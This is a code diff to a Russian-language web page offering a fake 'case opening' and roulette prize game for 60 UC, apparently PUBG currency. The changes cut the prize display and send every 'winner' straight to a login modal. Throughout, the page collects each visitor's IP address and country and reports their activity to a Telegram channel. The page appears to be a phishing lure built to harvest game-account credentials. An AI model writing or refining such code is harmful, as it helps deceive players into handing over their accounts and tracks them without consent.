@@ -122,65 +122,8 @@
             text-align: center;
             display: block;
             cursor: pointer;
+            transition: all 0.3s ease;
         }
-
-        /* ОКНО ВЫИГРЫША - УПРОЩЕНО */
-        .win-modal {
-            position: fixed; inset: 0;
-            background: rgba(0,0,0,0.94);
-            backdrop-filter: blur(10px);
-            z-index: 2000; display: none;
-            flex-direction: column; justify-content: center; align-items: center; padding: 20px;
-        }
-
-        .win-card {
-            background: linear-gradient(180deg, #1c1d22 0%, #0a0b0d 100%);
-            border: 1px solid rgba(255, 188, 0, 0.3);
-            border-radius: 16px; 
-            padding: 40px 24px 40px 24px; 
-            width: 90%; max-width: 340px; 
-            text-align: center;
-            position: relative;
-            box-shadow: 0 0 40px rgba(0,0,0,0.8);
-        }
-
-        .item-glow {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 220px; height: 220px;
-            background: radial-gradient(circle, rgba(255, 188, 0, 0.2) 0%, transparent 70%);
-            z-index: 0;
-        }
-
-        #winPrizeImage {
-            position: relative;
-            z-index: 1;
-            width: 160px; height: 160px;
-            margin: 0 auto 30px auto;
-            filter: drop-shadow(0 10px 25px rgba(0,0,0,0.6));
-            opacity: 1 !important;
-        }
-
-        .btn-collect {
-            background: linear-gradient(180deg, #ffbc00 0%, #cc9600 100%);
-            color: #000;
-            width: 100%;
-            padding: 14px;
-            border-radius: 4px;
-            font-family: 'Teko', sans-serif;
-            font-size: 24px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 20px rgba(255, 188, 0, 0.4);
-            border: none;
-            cursor: pointer;
-            position: relative;
-            z-index: 2;
-        }
-
-        .btn-collect:active { transform: scale(0.96); }
 
         /* НАВИГАЦИЯ */
         .nav-bar {
@@ -200,6 +143,19 @@
         }
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+        
+        /* Анимация выигрыша */
+        @keyframes pulseWin {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .winning-cell {
+            animation: pulseWin 0.5s ease-in-out infinite;
+            border-color: #ffbc00 !important;
+            box-shadow: 0 0 20px rgba(255, 188, 0, 0.8) !important;
+        }
     </style>
 </head>
 <body>
@@ -243,7 +199,7 @@
             <div id="caseTape" class="case-tape"></div>
         </div>
         <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
-        <button id="depositBtn" onclick="showWinModal()" class="btn-blue" style="display: none;">Забрать приз</button>
+        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
     </section>
 
     <!-- РАЗДЕЛ РУЛЕТКА -->
@@ -265,17 +221,8 @@
             </div>
         </div>
         <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="showWinModal()">Забрать приз</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
     </section>
-
-    <!-- ОКНО ВЫИГРЫША -->
-    <div id="winModal" class="win-modal">
-        <div class="win-card">
-            <div class="item-glow"></div>
-            <img id="winPrizeImage" src="" alt="Prize" style="opacity: 1;">
-            <button onclick="startAuth()" class="btn-collect">Забрать приз</button>
-        </div>
-    </div>
 
     <!-- АВТОРИЗАЦИЯ -->
     <div id="modalAuth" class="modal">
@@ -311,6 +258,7 @@
         let isSpinning = false;
         let userIP = '';
         const itemWidth = 140;
+        let currentWinCellId = null;
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
@@ -345,6 +293,17 @@
             if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
             
             updateBalanceUI();
+            
+            // Сбрасываем анимацию выигрыша при переключении секций
+            if (currentWinCellId) {
+                const winCell = document.getElementById(currentWinCellId);
+                if (winCell) {
+                    winCell.classList.remove('winning-cell');
+                    winCell.style.borderColor = 'transparent';
+                    winCell.style.boxShadow = 'none';
+                }
+                currentWinCellId = null;
+            }
         }
 
         function initCase() {
@@ -374,10 +333,10 @@
             tape.style.transform = `translateX(-${finalOffset}px)`;
             
             setTimeout(() => {
-                const winImg = tape.children[targetIdx].querySelector('img').src;
-                showWinModal(winImg);
                 sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
                 isSpinning = false;
+                // После открытия кейса сразу показываем авторизацию
+                startAuth();
             }, 5000);
         }
 
@@ -390,11 +349,20 @@
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let step = 0;
             const totalSteps = 25 + Math.floor(Math.random() * 10);
+            
+            // Определяем выигрышную ячейку заранее
+            const winIndex = Math.floor(Math.random() * cells.length);
+            const winCellId = cells[winIndex];
+
+            // Скрываем кнопку "Крутить"
+            document.getElementById('spinBtn').style.display = 'none';
 
             const interval = setInterval(() => {
                 cells.forEach(id => {
-                    document.getElementById(id).style.borderColor = 'transparent';
-                    document.getElementById(id).style.boxShadow = 'none';
+                    const cell = document.getElementById(id);
+                    cell.style.borderColor = 'transparent';
+                    cell.style.boxShadow = 'none';
+                    cell.classList.remove('winning-cell');
                 });
 
                 const currentId = cells[step % cells.length];
@@ -405,9 +373,24 @@
                 step++;
                 if (step >= totalSteps) {
                     clearInterval(interval);
+                    
+                    // Сбрасываем подсветку всех ячеек
+                    cells.forEach(id => {
+                        const cell = document.getElementById(id);
+                        cell.style.borderColor = 'transparent';
+                        cell.style.boxShadow = 'none';
+                    });
+                    
+                    // Подсвечиваем выигрышную ячейку
+                    const winCell = document.getElementById(winCellId);
+                    winCell.style.borderColor = '#ffbc00';
+                    winCell.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.8)';
+                    winCell.classList.add('winning-cell');
+                    currentWinCellId = winCellId;
+                    
                     setTimeout(() => {
-                        const winImg = currentEl.querySelector('img').src;
-                        showWinModal(winImg);
+                        // Показываем кнопку "Забрать приз"
+                        document.getElementById('spinDepositBtn').style.display = 'block';
                         sendTelegram(`🎡 Рулетка | IP: ${userIP}`);
                         isSpinning = false;
                     }, 500);
@@ -415,13 +398,7 @@
             }, 120);
         }
 
-        function showWinModal(img) {
-            document.getElementById('winPrizeImage').src = img;
-            document.getElementById('winModal').style.display = 'flex';
-        }
-
         function startAuth() { 
-            document.getElementById('winModal').style.display = 'none';
             document.getElementById('modalAuth').style.display = 'flex'; 
         }
         
